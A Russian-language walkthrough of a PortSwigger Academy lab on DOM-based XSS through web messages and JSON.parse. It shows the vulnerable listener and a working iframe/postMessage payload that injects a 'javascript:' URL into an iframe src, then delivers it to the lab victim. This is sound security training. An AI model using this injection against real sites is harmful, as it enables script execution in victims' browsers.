Откроем страницу 

Нажмем `ПКМ` -> `Inspect`
и увидим следующий скрипт
```
<script>
                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
                    </script>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/3.%20DOM%20XSS%20using%20web%20messages%20and%20JSON.parse/pics%20for%20walkthrough/1.png)

Когда созданный нами iframe загружается, метод `postMessage()` отправляет веб-сообщение на домашнюю страницу с типом `load-channel`. Прослушиватель событий получает сообщение и анализирует его с помощью `JSON.parse()` перед отправкой на коммутатор.

Переключатель запускает функцию `load-channel case`, которая присваивает свойству `url` сообщения атрибут `src` элемента `ACMEplayer.element iframe`. Однако в этом случае свойство `url` сообщения фактически содержит нашу полезную нагрузку JavaScript.

Поскольку второй аргумент указывает, что для веб-сообщения разрешен любой `targetOrigin`, а обработчик события не содержит никакой проверки происхождения, полезная нагрузка устанавливается как` src iframe ACMEplayer.element`. Функция `print()` вызывается, когда пользователь загружает страницу в свой браузер.

Перейдем в `Exploit server` и сконфигурируем вредоносный payload
```
<iframe src=https://0a5000940496bdfc801c67190053005d.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/3.%20DOM%20XSS%20using%20web%20messages%20and%20JSON.parse/pics%20for%20walkthrough/2.png)

Если нажмем `View exploit` увидим, что все отработало

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/3.%20DOM%20XSS%20using%20web%20messages%20and%20JSON.parse/pics%20for%20walkthrough/3.png)


Нажмем `Store` -> `Deliver exploit to victim` и получим уведомление об успешно выполненной лабораторной работе
